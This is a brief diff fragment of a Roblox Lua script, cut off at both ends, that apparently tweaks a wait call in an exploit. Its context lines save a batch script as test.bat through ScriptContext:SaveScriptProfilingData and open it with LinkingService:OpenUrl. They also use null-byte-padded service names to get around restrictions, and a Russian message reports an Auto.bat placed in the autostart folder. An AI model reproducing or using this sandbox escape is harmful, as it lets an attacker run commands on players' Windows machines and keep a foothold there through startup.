@@ -32,7 +32,7 @@ echo Файл Auto.bat успешно сохранён в папку автоз�
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
-task.wait(1)
+wait(1)
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
